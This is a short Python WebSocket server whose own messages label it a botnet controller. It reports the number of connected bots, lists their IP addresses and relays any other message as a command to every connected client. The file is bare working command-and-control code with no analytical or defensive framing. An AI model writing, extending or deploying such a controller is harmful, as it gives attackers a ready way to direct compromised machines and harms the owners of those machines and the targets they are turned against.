import asyncio
import websockets

clients = {}

async def handler(websocket, path):
    clients[websocket] = websocket.remote_address[0]  # Store client IP
    try:
        async for message in websocket:
            print(f"Received: {message}")
            if message == "getconscount":
                await websocket.send(f"{len(clients)}")
                print("Sent size of botnet")
            elif message == "getconsips":
                ips = "|".join(clients.values())  # Join IPs with "|"
                await websocket.send(ips)
                print("Sent IPs of botnet")
            else:
                tasks = [asyncio.create_task(client.send(message)) for client in clients if client != websocket]
                await asyncio.gather(*tasks)
    finally:
        del clients[websocket]

start_server = websockets.serve(handler, "0.0.0.0", 8080)

print("WebSocket server running on ws://0.0.0.0:8080")

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
